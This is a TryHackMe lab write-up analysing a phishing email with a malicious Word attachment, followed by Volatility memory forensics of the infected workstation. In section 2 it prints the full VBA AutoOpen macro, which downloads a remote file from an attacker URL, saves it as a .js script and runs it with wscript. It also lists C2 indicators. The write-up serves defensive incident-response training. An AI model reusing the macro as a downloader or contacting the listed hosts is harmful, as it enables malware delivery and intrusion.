# Boogeyman 2 — Phishing, Malicious VBA and Memory Forensics

**Platform:** TryHackMe  
**Room:** Boogeyman 2  
**Category:** SOC Analyst / Digital Forensics and Incident Response (DFIR)  
**Tools:** Linux command-line tools, Python `email`, `olevba`, Volatility 3 (v2.5.0), `strings`  
**Investigation environment:** Provided TryHackMe VM and supplied evidence  
**Author:** [Mirciuz](https://github.com/Mirciuz)

> **Scope:** This is an educational incident investigation performed on a supplied lab image. Paths, domains and IP addresses below are recorded as **investigative indicators**, not as destinations to contact or payloads to execute. The suspicious document and executable were not run during this analysis.

## Executive summary

An HR specialist at Quick Logistics LLC, **Maxine Beck**, received a job application email carrying a malicious Microsoft Word `.doc` attachment. Static analysis identified a VBA `AutoOpen` macro designed to download content from an attacker-controlled-looking HTTPS endpoint, save it locally as `C:\ProgramData\update.js`, and start it with `wscript.exe`.

Memory analysis of `WKSTN-2961.raw` corroborated the execution chain:

```text
OUTLOOK.EXE  (PID 1440)
└── WINWORD.EXE  (PID 1124)
    └── wscript.exe  (PID 4260)
        └── updater.exe  (PID 6216)
            └── conhost.exe  (PID 4464)
```

The `updater.exe` command line pointed to `C:\Windows\Tasks\updater.exe`. Volatility identified multiple TCP records associated with PID 6216 connecting to **128.199.95.189:8080**. Loaded modules included .NET and PowerShell components, and strings in the process-memory dump included `PowershellEmpire`, `DotNetEmpire`, `Sharpire` and `stage2Response`. Taken together, these observations strongly support malicious execution and suggest possible C2 activity. The available connection records **do not, on their own, establish data exfiltration**.

## Evidence and chain of custody notes

| Evidence | Source | Purpose |
| --- | --- | --- |
| `Resume - Application for Junior IT Analyst Role.eml` | TryHackMe artefacts | Email headers and MIME attachment |
| `Resume_WesleyTaylor.doc` | Extracted from the `.eml` with Python | Static macro analysis |
| `WKSTN-2961.raw` | TryHackMe artefacts | Memory forensics |
| `pid.6216.dmp` | Exported from the raw image with `windows.memmap` | Strings analysis of `updater.exe` |

For a real-world investigation, record acquisition time, evidence owner, storage location, hash values and analyst actions in a formal chain-of-custody log. The lab output showed an extracted document of approximately **63 KB** and a memory image of approximately **1,000 MB**. The `pid.6216.dmp` export was approximately **309 MB**.

## 1. Phishing email triage

The raw message was inspected without opening the attachment:

```bash
grep -iE '^(From|To|Subject|Date):' \
  'Resume - Application for Junior IT Analyst Role.eml'
```

**Observed headers**

| Field | Value |
| --- | --- |
| From | `westaylor23@outlook.com` |
| To | `maxine.beck@quicklogisticsorg.onmicrosoft.com` |
| Subject | `Resume - Application for Junior IT Analyst Role` |
| Date | `Sun, 20 Aug 2023 18:19:20 +0000` |
| Sending IP (authentication header) | `40.92.53.96` |
| SPF / DKIM / DMARC | `pass` / `pass` / `pass` |

SPF, DKIM and DMARC passing means the email met the relevant authentication and alignment checks; **it does not mean the attachment is safe**. The job application pretext was credible for an HR recipient.

### MIME attachment

```bash
grep -iE '^(Content-Type|Content-Disposition|Content-Transfer-Encoding):' \
  'Resume - Application for Junior IT Analyst Role.eml'
```

Relevant output:

```text
Content-Type: application/msword; name="Resume_WesleyTaylor.doc"
Content-Disposition: attachment; filename="Resume_WesleyTaylor.doc"; size=64000;
Content-Transfer-Encoding: base64
```

The Base64 transfer encoding is ordinary MIME packaging and **is not an IOC by itself**. The legacy `.doc` format can contain VBA macros.

### Extracting the attachment without launching Word

```python
import email
from pathlib import Path

eml_path = Path('Resume - Application for Junior IT Analyst Role.eml')
message = email.message_from_bytes(eml_path.read_bytes())

for part in message.walk():
    if part.get_filename() == 'Resume_WesleyTaylor.doc':
        Path('Resume_WesleyTaylor.doc').write_bytes(
            part.get_payload(decode=True)
        )
```

Verify the actual file type and compute an evidence hash:

```bash
file Resume_WesleyTaylor.doc
md5sum Resume_WesleyTaylor.doc
sha256sum Resume_WesleyTaylor.doc
```

The `file` utility identified a **Composite Document File V2 Document** (OLE/legacy Office format). **Hash values must be copied from the VM output; no locally computed hash was included in the provided investigation evidence.**

## 2. Static analysis: malicious VBA macro

Command:

```bash
olevba Resume_WesleyTaylor.doc
```

`olevba` identified a VBA module containing this macro:

```vb
Sub AutoOpen()

spath = "C:\ProgramData\"
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\update.js", 2
End With

Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")

End Sub
```

**Interpretation**

1. `AutoOpen` provides an automatic-execution entry point, if macros are allowed to run.
2. `Microsoft.XMLHTTP` performs a network request for a remote resource whose path ends in `update.png`.
3. `ADODB.Stream` saves the response body as `C:\ProgramData\update.js` (the doubled backslash in the concatenation is accepted by Windows path handling).
4. `WScript.Shell.Exec` starts `wscript.exe C:\ProgramData\update.js`.

The contrast between a remote `.png` filename and a local `.js` script filename is **consistent with masquerading**. The precise content of the downloaded response was not directly recovered in this step.

## 3. Volatility: process-tree analysis

Locate Volatility and inspect process ancestry:

```bash
which vol
vol -f WKSTN-2961.raw windows.pstree
```

The lab returned `/usr/local/bin/vol` and the following relevant parent-child relationships:

| PID | PPID | Process | Creation time (2023-08-21) |
| ---: | ---: | --- | --- |
| 1440 | 596 | `OUTLOOK.EXE` | 14:09:04 |
| 1124 | 1440 | `WINWORD.EXE` | 14:12:31 |
| 4260 | 1124 | `wscript.exe` | 14:12:47 |
| 6216 | 4260 | `updater.exe` | 14:12:48 |
| 4464 | 6216 | `conhost.exe` | 14:14:03 |

The process relationship `WINWORD.EXE → wscript.exe` matches the behavior programmed into the macro. The subsequent `wscript.exe → updater.exe` relationship gives a strong lead for the next payload stage, but the mechanism by which the script obtained that executable is not proven by `pstree` alone.

### Process command lines

```bash
vol -f WKSTN-2961.raw windows.cmdline | grep -iE 'wscript|updater|WINWORD'
```

Observed:

```text
WINWORD.EXE  "C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc
wscript.exe  wscript.exe C:\ProgramData\update.js
updater.exe  "C:\Windows\Tasks\updater.exe"
```

The Outlook cache path links the executed Word document to the suspicious email attachment. The `wscript.exe` command line exactly matches the macro's intended action. `updater.exe` is running from an unusual location for a software updater; the path alone is not conclusive, but is highly suspicious in context.

## 4. Network connections: suspected C2

```bash
vol -f WKSTN-2961.raw windows.netscan | grep -w 6216
```

Relevant TCP records:

| Local endpoint | Remote endpoint | State | PID | Record timestamp (2023-08-21) |
| --- | --- | --- | ---: | --- |
| `10.10.49.181:63291` | `128.199.95.189:8080` | CLOSED | 6216 | 14:14:13 |
| `10.10.49.181:63298` | `128.199.95.189:8080` | CLOSED | 6216 | 14:14:24 |
| `10.10.49.181:63299` | `128.199.95.189:8080` | CLOSED | 6216 | 14:14:26 |
| `10.10.49.181:63308` | `128.199.95.189:8080` | CLOSED | 6216 | 14:14:39 |
| `10.10.49.181:63331` | `128.199.95.189:8080` | CLOSED | 6216 | 14:15:17 |
| `10.10.49.181:63339` | `128.199.95.189:8080` | CLOSED | 6216 | 14:15:40 |
| `10.10.49.181:63348` | `128.199.95.189:8080` | CLOSED | 6216 | 14:16:05 |
| `10.10.49.181:63350` | `128.199.95.189:8080` | CLOSED | 6216 | 14:16:11 |

These are **eight recovered TCP records**, all associated with the same process and remote endpoint. They are consistent with repeated outbound network activity; the pattern is **not perfectly periodic**. The TCP state `CLOSED` does not establish whether the remote service received data, what the data contained, or whether sensitive information was exfiltrated.

**Potential C2 endpoint:** `128.199.95.189:8080`.

## 5. Process memory and module analysis

### Suspicious memory protections

```bash
vol -f WKSTN-2961.raw windows.malfind --pid 6216
```

Observed suspicious region:

```text
Process:       updater.exe
PID:           6216
Start VPN:     0x13e0000
End VPN:       0x13effff
Tag:           VadS
Protection:    PAGE_EXECUTE_READWRITE
PrivateMemory: 1
```

A private region with read-write-execute (RWX) permissions warrants investigation, because dynamically generated or injected code may be writable and executable. However, **RWX is not proof of injection** and may occur in legitimate software. The short hexdump/disassembly does not establish that the displayed bytes were executed.

### Loaded DLLs

```bash
vol -f WKSTN-2961.raw windows.dlllist --pid 6216
```

Notable modules from the process:

```text
MSCOREE.DLL
clr.dll
System.Management.Automation.ni.dll
Microsoft.PowerShell.ConsoleHost.ni.dll
Microsoft.PowerShell.Commands.Management.ni.dll
winhttp.dll
WS2_32.dll
DNSAPI.dll
System.Management.ni.dll
```

The .NET runtime and PowerShell-related libraries suggest that `updater.exe` can **host PowerShell functionality within its own process**, potentially without launching a distinct `powershell.exe` child. A module list does not prove which PowerShell commands, if any, actually ran. Network and WMI-related DLLs are also common in legitimate software.

### Export the process's accessible memory

```bash
mkdir -p ~/Desktop/process6216
vol -f WKSTN-2961.raw -o ~/Desktop/process6216 \
  windows.memmap --pid 6216 --dump
ls -lh ~/Desktop/process6216/
```

The resulting `pid.6216.dmp` was approximately 309 MB. Strings were extracted without executing the data:

```bash
strings -a ~/Desktop/process6216/pid.6216.dmp \
  | grep -iE 'powershell|http|128\.199\.95\.189|download' \
  | head -n 30

strings -a ~/Desktop/process6216/pid.6216.dmp \
  | grep -i -C 5 'PowershellEmpire' | head -n 60
```

Relevant strings found:

```text
DownloadData
HttpStatusCode
PowershellEmpire
HttpWebResponse
RunPowerShell
DotNetEmpire
Sharpire
stage2Response
```

These strings raise the possibility of an **Empire-associated .NET agent** or related functionality, and `stage2Response` may relate to staging. This remains **an attribution hypothesis**, not a definitive identification of the payload family or proof of successful C2 tasking. Strings can include unused code, metadata and library content.

## 6. Incident timeline

| Date / time shown in evidence | Observation |
| --- | --- |
| 2023-08-20 18:19:20 UTC | Phishing email `Date` header |
| 2023-08-21 14:09:04 | `OUTLOOK.EXE` created, PID 1440 |
| 2023-08-21 14:12:31 | `WINWORD.EXE` created, PID 1124 |
| 2023-08-21 14:12:47 | `wscript.exe` created, PID 4260 |
| 2023-08-21 14:12:48 | `updater.exe` created, PID 6216 |
| 2023-08-21 14:14:03 | `conhost.exe` created, PID 4464 |
| 2023-08-21 14:14:13–14:16:11 | Eight recovered TCP records to `128.199.95.189:8080` |

The process and socket timestamps above are as displayed by Volatility. Confirm time-zone settings and clock integrity before merging evidence from different systems in a production incident.

## 7. Indicators of compromise / investigation

| Type | Indicator | Confidence / context |
| --- | --- | --- |
| Sender email | `westaylor23@outlook.com` | Observed in email headers |
| Recipient email | `maxine.beck@quicklogisticsorg.onmicrosoft.com` | Observed in email headers |
| Attachment | `Resume_WesleyTaylor.doc` | Observed in MIME headers |
| Stage-2 URL | `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png` | Observed in VBA macro |
| Stage-2 local path | `C:\ProgramData\update.js` | Observed in macro and process command line |
| Suspicious executable | `C:\Windows\Tasks\updater.exe` | Observed in process command line |
| Suspected C2 | `128.199.95.189:8080` | Observed in multiple `netscan` records |
| Office attachment cache path | `C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc` | Observed in Word command line |

**Not independently verified in the supplied VM output:** the attachment's MD5 digest, a precise URL from which `update.js` obtained `updater.exe`, and the exact scheduled-task persistence command. These must be checked against the image or other evidence before promoting them to confirmed findings.

## 8. MITRE ATT&CK mapping

| Tactic / technique | ATT&CK ID | Evidence and qualification |
| --- | --- | --- |
| Phishing: Spearphishing Attachment | T1566.001 | Job application email with a malicious Word attachment |
| User Execution: Malicious File | T1204.002 | Word was launched from Outlook's attachment cache |
| Command and Scripting Interpreter: Visual Basic | T1059.005 | VBA `AutoOpen` macro in the `.doc` |
| Ingress Tool Transfer | T1105 | Macro attempts to download a remote file |
| Command and Scripting Interpreter: JavaScript | T1059.007 | `wscript.exe` executing `update.js` |
| Masquerading | T1036 | Remote `.png` resource saved as a `.js` script; consistent with disguise |
| Command and Control | T1071 (candidate) | Repeated TCP activity; the application-layer protocol is not yet established |
| Scheduled Task/Job: Scheduled Task | T1053.005 (unverified) | The room asks about persistence; the task creation command was not recovered from the supplied outputs |

Do not claim successful data exfiltration, persistence, or specific remote commands without independent supporting telemetry.

## 9. Impact assessment and recommended response

**Confirmed:** a malicious document was opened; its scripted execution behavior correlates with an observed process chain; an unusual executable was launched from `C:\Windows\Tasks`; repeated outbound TCP records point to an external IP on port 8080.

**Suspected / not demonstrated:** interactive C2 control, precise staging behavior of `update.js`, the payload family, successful data theft, lateral movement, and persistent scheduled tasks.

For a real incident, the next response actions would be to isolate the affected endpoint, preserve volatile and disk evidence, block or investigate the confirmed suspicious destination, investigate the user account and any additional hosts contacting the endpoint, inspect endpoint logs and scheduled tasks, and use available network/proxy/EDR telemetry to assess commands and data transfer. Only then determine the full scope of impact and complete eradication and recovery.

## 10. Skills demonstrated and lessons learned

- Triaged phishing headers, MIME structure and attachment metadata without assuming that SPF/DKIM/DMARC `pass` means safety.
- Safely extracted an encoded email attachment and inspected an OLE Word file.
- Used `olevba` to identify a macro downloader and its execution path.
- Correlated `pstree` PID/PPID relationships with `cmdline` evidence.
- Investigated connections with `netscan` while distinguishing a socket record from proof of exfiltration.
- Reviewed `malfind`, `dlllist` and a process memory export, avoiding over-interpretation of RWX memory and strings.
- Practiced evidence-led incident reporting and confidence labels: **observed**, **inferred**, and **unverified**.

---

**Portfolio:** [SOC-Analyst-Labs](https://github.com/Mirciuz/SOC-Analyst-Labs)  
**Training platform:** [TryHackMe](https://tryhackme.com/)
